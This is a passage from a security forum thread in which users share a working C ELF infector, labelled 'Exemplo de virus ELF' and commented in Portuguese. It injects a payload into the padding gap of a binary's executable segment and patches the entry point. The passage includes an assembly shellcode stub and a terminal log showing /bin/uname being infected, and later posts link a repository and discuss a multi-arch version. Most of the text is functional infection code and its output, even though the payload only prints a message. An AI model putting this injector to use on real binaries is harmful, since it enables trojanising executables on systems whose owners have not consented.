  int         n_seg = elf_hdr-&gt;e_phnum;
  int         i;

//  printf("O tamanho de struct Elf64_Phdr: %ld \n", sizeof(Elf64_Phdr));

  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr-&gt;e_phoff);
  for (i = 0; i &lt; n_seg; i++)
    {
        printf (" [INFO] Segment %d: Type: %8x (%x) Offset: %8x "
                "FSize:%8x MSize:%8x\n",
                i, elf_seg-&gt;p_type, elf_seg-&gt;p_flags,
                (unsigned int)elf_seg-&gt;p_offset,
                (unsigned int)elf_seg-&gt;p_filesz,
                (unsigned int)elf_seg-&gt;p_memsz);

      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg
                            + (unsigned int) elf_hdr-&gt;e_phentsize);
    }

}
#endif

// len: tamanho do gap
// p: final do segmento
// d: arquivo elf com as section e program table
// fsize: tamanho do binario
//
//         /* Find executable segment and obtain offset and gap size */
//        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &amp;p, &amp;len);
Elf64_Phdr* elfi_find_gap(void *mapeado, int TamanhoArquivo, int *p, int *len)
{
        // struct header ELF
        Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) mapeado;
        // struct program header
        Elf64_Phdr* elf_program, *text_program_vitima;
        // e_phnum: numero de entradas na tabela programa
        int         n_seg = elf_hdr-&gt;e_phnum;
        int         i;
        int         text_end, gap=TamanhoArquivo;

        //printf("O tamanho de struct Elf64_Phdr: %ld \n", sizeof(Elf64_Phdr));
        //printf("O tamanho da variavel elf_hdr: %ld \n", sizeof(elf_hdr));
        //printf("O tamanho de struct elf_hdr-&gt;e_phoff: %ld \n", sizeof(elf_hdr-&gt;e_phoff));



        // e_phoff: aponta para o inicio da tabela de programa
        elf_program = (Elf64_Phdr *) ((unsigned char*) elf_hdr + (unsigned int) elf_hdr-&gt;e_phoff);
//      printf("p_type %d \n", elf_seg-&gt;p_type);

        for (i = 0; i &lt; n_seg; i++)
        {
        //      printf("elf_program-&gt;p_flags: %#x\n", elf_program-&gt;p_flags);
        //      printf("elf_program-&gt;p_type: %#x\n", elf_program-&gt;p_type);
//      printf("elf_program-&gt;p_offset: %#lx\n", elf_program-&gt;p_offset);
        // p_flags: flags define o tipo do segmento(cabecalho de programa
        // Name         | Value   | Meaning
        // PF_X         | 0x1     | Execute
        // PF_W         | 0x2     | Write
        // PF_R         | 0x4     | Read
        // PF_MASKPROC  | 0xf0000000 | Unspecified
        // 0x1 and 0x011 = 1 (verdadeiro)
        // 0x2 and 0x011 = 0 (falso)
        // 0x4 and 0x011 = 0 (falso)
        // 0xf0000000 and 0x011 = 0 (falso)
        // Entao o comando: elf_seg-&gt;p_flags &amp; 0x011 -&gt; Procura por um segmento "execute"
        if (elf_program-&gt;p_type == PT_LOAD &amp;&amp; elf_program-&gt;p_flags &amp; 0x011)
      {

                        printf ("+ Processando Vitima -&gt; Encontrado segmento .text executavel (#%d)\n", i);
        /*              printf("elf_program-&gt;p_type: %d \n", elf_program-&gt;p_type);
                        printf("elf_program-&gt;p_offset: %ld \n", elf_program-&gt;p_offset);
                        printf("elf_program-&gt;p_filesz: %ld \n", elf_program-&gt;p_filesz);
*/
                        //text_seg = elf_seg(o segmento progam atual
                        text_program_vitima = elf_program;


                        // elf_program-&gt;p_offset: Contem o offset do segmento program no arquivo binario
                        // elf_program-&gt;p_filesz: Size in bytes of the segment in the file image. May be 0.
                        // variavel text_end pega o tamanho do segmento text
                        text_end = elf_program-&gt;p_offset + elf_program-&gt;p_filesz;
//                      printf("o valor de text_end: %d \n", text_end);
      } else {
                        //p_offset: Contem o offset do segmento program no arquivo binario
                        // elf_program-&gt;p_offset do segundo segmento LOAD do tipo RW - o final do
                        // segmento LOAD Executavel
                        if (elf_program-&gt;p_type == PT_LOAD &amp;&amp; (elf_program-&gt;p_offset - text_end) &lt; gap)
                        {

/*                      printf("elf_program-&gt;p_type: %d \n", elf_program-&gt;p_type);
                        printf("elf_program-&gt;p_offset: %lx \n", elf_program-&gt;p_offset);
                        printf("elf_program-&gt;p_filesz: %ld \n", elf_program-&gt;p_filesz);

                        printf("o valor de text_end: %d \n", text_end);
                        printf("o valor de gap: %d \n", gap);
*/
                        printf ("   * Processando Vitima -&gt; Encontrado segmento LOAD (#%d) fechado para .text (offset: 0x%x)\n", i, (unsigned int)elf_program-&gt;p_offset);

                                gap = elf_program-&gt;p_offset - text_end;
                        }
                }
                // q
                // e_phentsize: contem o tamanho de uma entrada de uma tabela de secao
      elf_program = (Elf64_Phdr *) ((unsigned char*) elf_program + (unsigned int) elf_hdr-&gt;e_phentsize);
    }

        *p = text_end;
        *len = gap;


        return text_program_vitima;
}



Elf64_Shdr *elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  // e_shoff:   Points to the start of the section header table.
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr-&gt;e_shoff);
  // e_shstrndx: Contains index of the section header table entry that contains the section names.
  Elf64_Shdr *sh_strtab = &amp;shdr[elf_hdr-&gt;e_shstrndx];
  // sh_offset: Offset of the section in the file image.
  const char *const sh_strtab_p = data + sh_strtab-&gt;sh_offset;

  // e_shnum: Contains the number of entries in the section header table.
  printf ("+ Procesasmento Payload -&gt; Quantidade de Seções no arquivo Payload: %d . Procurando pela seção '%s'\n", elf_hdr-&gt;e_shnum, name);


  for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++)
  {
//      printf("Processamento Payload -&gt; O shdr[%d].sh_name: %x \n", i, shdr[i].sh_name);
        sname = (char*) (sh_strtab_p + shdr[i].sh_name);

        printf(" + Processando payload -&gt; sname: '%s'\n", sname);


        if (!strcmp (sname, name))
        {
                printf("entrou no if retornando \n");
                printf("shdr-&gt;sh_name: %x  \n", shdr[i].sh_name);


                printf("shdr-&gt;sh_type: %x \n", shdr[i].sh_type);
                printf("shdr-&gt;sh_addr: %lx \n", shdr[i].sh_addr);
                return &amp;shdr[i];
        }
  }

  return NULL;
}



// MapeadoVitima + p: e o arquivo vitima mapeado mais o program header
// len: tamanho do gap
// pat: padrao a buscar
// val: entrypoint do arquivo elf vitima
//
//  elfi_mem_subst (MapeadoVitima+p, payload_text_section-&gt;sh_size, 0x11111111, (long)ep);
int elfi_mem_subst(void *m, int len, long pat, long val)
{
        // obtem o endereco do program header da vitima
        unsigned char *p = (unsigned char*)m;
        long v;
        int i, r;

        /*
        printf("p: %hhn\n", p);
        printf("pat: %lx\n", pat);
        printf("val: %lx\n", val);
        printf("entrando no for\n\n");
*/
//      printf("len: %d \n", len);


        for (i = 0; i &lt; len; i++)
        {
                v = *((long*)(p+i));
                // faz um xor da variavel v e varial pat
                r = v ^pat;


//              printf("v: %lx\n", v);
        //      printf("r: %x\n", r);

                if (r ==0)
                {
                        printf ("+ Padrão %lx encontrado no offset %d -&gt; %lx\n", pat, i, val);
                        *((long*)(p+i)) = val;
                        return 0;
                }
        }
        return -1;
}

int main (int argc, char *argv[])
{
        void        *MapeadoVitima, *MapeadoPayload;
        int         Vitima_fd, payload_fd;
        int         TamanhoVitima, TamanhoPayload;
        // Struct para o header ELF
        Elf64_Ehdr* elf_hdr;
        // Struct para program header
        Elf64_Phdr  *vitima_text_program;
        // struct para section header
        Elf64_Shdr  *payload_text_section;
        // struct de enderecos base
        Elf64_Addr  base, ep;
        //variavel len = gap
        //variavel p=final do segmento LOAD executavel
        int         p, len;

        int offset_mode = 0x00;

        printf ("Exemplo de virus ELF\n\n");
        if (argc == 2){
        	printf("Running in offset mode");
        	offset_mode = 0x01;
        }
        if ((argc != 3 &amp;&amp; argc != 2))
        {
                fprintf (stderr, "Uso:\n  %s &lt;arquivo ELF&gt; &lt;payload&gt;\n", argv[0]);
                exit (1);
        }

        /* Open and map target ELF */
        Vitima_fd = elfi_open_and_map (argv[1], &amp;MapeadoVitima, &amp;TamanhoVitima);

        /* Get Application Entry point */
        elf_hdr = (Elf64_Ehdr *) MapeadoVitima;
        ep = elf_hdr-&gt;e_entry;
        printf ("+ Processando Vitima -&gt; Valor do Entry point: %p\n", (void*) ep);

#ifdef DEBUG
  elfi_dump_segments (d);
#endif

        /* Find executable segment and obtain offset and gap size */
        vitima_text_program = elfi_find_gap (MapeadoVitima, TamanhoVitima, &amp;p, &amp;len);
        if(offset_mode == 0x01){
        	printf("offset == %p\n", p - elf_hdr-&gt;e_entry);
        	return 0;
        }

        // p_vaddr: Virtual address of the segment program in memory
        base = vitima_text_program-&gt;p_vaddr;

        printf ("+ Processando vitima -&gt; Endereco Base(Base Address) : 0x%p\n", (void*)base);

        /* Process payload */
        payload_fd = elfi_open_and_map (argv[2], &amp;MapeadoPayload, &amp;TamanhoPayload);

        // funcao que busca o segmento .text
        // MapeadoPayload: arquivo elf a ser injetado na vitima
        // payload_text_section: retorna com o section segmento do .text a ser injetado
        payload_text_section = elfi_find_section (MapeadoPayload, ".text");

        //mostraSectionHeaderELF(payload_text_section);

  /* XXX: Looks like we do not really have to patch the segment sizes */
  /*
  vitima_text_program-&gt;p_filesz += payload_text_section-&gt;sh_size;
  vitima_text_program-&gt;p_memsz += payload_text_section-&gt;sh_size;
  */

        printf ("+ Processando Payload -&gt; Secao .text do arquivo Payload encontrado no offset %lx (Tamanho: %lx bytes)\n",  payload_text_section-&gt;sh_offset, payload_text_section-&gt;sh_size);

        if (payload_text_section-&gt;sh_size &gt; len)
        {
                fprintf (stderr, "- Processando Payload -&gt; Arquivo Payload muito grande, Não é possivel infectar.\n");
                exit (1);
        }
  /* Copy payload in the segment padding area */
  // memmove(dest, src, count): copia count bytes do buffer apontado por src para o buffer apontado por dest.
  //

  memmove (MapeadoVitima + p, MapeadoPayload + payload_text_section-&gt;sh_offset, payload_text_section-&gt;sh_size );

  // jbx81: sorry but i don't speak portuguese :)

  if(elf_hdr-&gt;e_type == 0x02){
	  /* Patch return address */

	  elfi_mem_subst (MapeadoVitima+p, payload_text_section-&gt;sh_size, 0x11111111, (long)ep);

	  /* Patch entry point */
	  elf_hdr-&gt;e_entry = (Elf64_Addr) (base + p);

  } else if(elf_hdr-&gt;e_type == 0x03){
	  /*
	   * let's talk about how payload should be.
section .text
        global _start
_start:
        sub r12, 0x4f20 &lt;- put offset here!
        push rax
        push rdi
        push rsi
        push rdx

        mov rax,1       ; [1] - sys_write
        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
        mov rdx, msg_end - msg      ; msg size
        syscall         ; calls the function stored in rax

        pop rdx
        pop rsi
        pop rdi
        pop rax
        jmp r12
align 8
        msg     db 'Arquivo infectado Teste',0x0a,0
        msg_end db 0x0


	   *
	   */
	  elf_hdr-&gt;e_entry = (Elf64_Addr) (base + p);
  }
  /* Close files and actually update target file */
  close (payload_fd);
  close (Vitima_fd);

  return 0;
}
</code></pre>
<p>shellcode.asm</p>
<pre><code>section .text
        global _start
_start:
	sub r12, 0x4f20
	push rax
	push rdi
	push rsi
	push rdx

        mov rax,1       ; [1] - sys_write
        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
        mov rdx, msg_end - msg      ; msg size
        syscall         ; calls the function stored in rax

	pop rdx
	pop rsi
	pop rdi
	pop rax
	jmp r12
align 8
        msg     db 'Arquivo infectado Teste',0x0a,0
        msg_end db 0x0
</code></pre>
<p>usage:</p>
<pre><code>$ cp /bin/uname evil_uname
$ ./Infecta evil_uname 
Exemplo de virus ELF

Running in offset mode+ Arquivo mapeado (35032 bytes ) em 0x7fff7ae5a540
+ Processando Vitima -&gt; Valor do Entry point: 0x1f60
+ Processando Vitima -&gt; Encontrado segmento .text executavel (#2)
   * Processando Vitima -&gt; Encontrado segmento LOAD (#3) fechado para .text (offset: 0x7990)
offset == 0x4f20
$ #change offset on shellcoda.asm 
$ nasm -f elf64 shellcode.asm
$ ./Infecta evil_uname shellcode.o 
Exemplo de virus ELF

+ Arquivo mapeado (35032 bytes ) em 0x7ffc51d5d920
+ Processando Vitima -&gt; Valor do Entry point: 0x1f60
+ Processando Vitima -&gt; Encontrado segmento .text executavel (#2)
   * Processando Vitima -&gt; Encontrado segmento LOAD (#3) fechado para .text (offset: 0x7990)
+ Processando vitima -&gt; Endereco Base(Base Address) : 0x(nil)
+ Arquivo mapeado (704 bytes ) em 0x7ffc51d5d928
+ Procesasmento Payload -&gt; Quantidade de Seções no arquivo Payload: 5 . Procurando pela seção '.text'
 + Processando payload -&gt; sname: ''
 + Processando payload -&gt; sname: '.text'
entrou no if retornando 
shdr-&gt;sh_name: 1  
shdr-&gt;sh_type: 1 
shdr-&gt;sh_addr: 0 
+ Processando Payload -&gt; Secao .text do arquivo Payload encontrado no offset 180 (Tamanho: 4a bytes)
$ ./evil_uname 
Arquivo infectado Teste
Linux
</code></pre>
<p>i will made official version of it.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../../elf-injector-patching-issues/22714/7.html">ELF Injector Patching Issues</a>
<meta itemprop="position" content="1">
</div>
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="../13605.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-05-13T18:37:36Z" class="post-time">
May 13, 2019, 6:37pm
</time>
<meta itemprop="dateModified" content="2019-05-13T18:37:36Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Hi <a class="mention" href="https://0x00sec.org/u/spiderslack">@spiderslack</a></p>
<p>I have just updated my repo for completeness. <a class="mention" href="https://0x00sec.org/u/jbx81">@jbx81</a> solution is also good.</p>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
<a href="https://github.com/0x00pf/0x00sec_code/tree/master/elfpie" target="_blank" rel="noopener nofollow ugc">GitHub</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png" class="thumbnail" width height>
<h3><a href="https://github.com/0x00pf/0x00sec_code/tree/master/elfpie" target="_blank" rel="noopener nofollow ugc">0x00pf/0x00sec_code</a></h3>
<p>Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<p>Guys let me know if you want a post on this or you are all fine with just the code</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/jbx81"><span itemprop="name">jbx81</span></a>
(jbx81)
</span>
<link itemprop="mainEntityOfPage" href="../13605.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-05-13T21:09:22Z" class="post-time">
May 13, 2019, 9:09pm
</time>
<meta itemprop="dateModified" content="2019-05-13T21:09:22Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Your solution is better! i’m working to make a multi-arch ELF infector. nice work <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="../13605.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-05-13T21:14:10Z" class="post-time">
May 13, 2019, 9:14pm
</time>
<meta itemprop="dateModified" content="2019-05-13T21:14:10Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks mate!</p>
<p>Looking forward to that multi-arch ELF infector!!!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="../13605.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-06-10T23:26:10Z" class="post-time">
June 10, 2019, 11:26pm
</time>
<meta itemprop="dateModified" content="2019-06-10T23:26:10Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
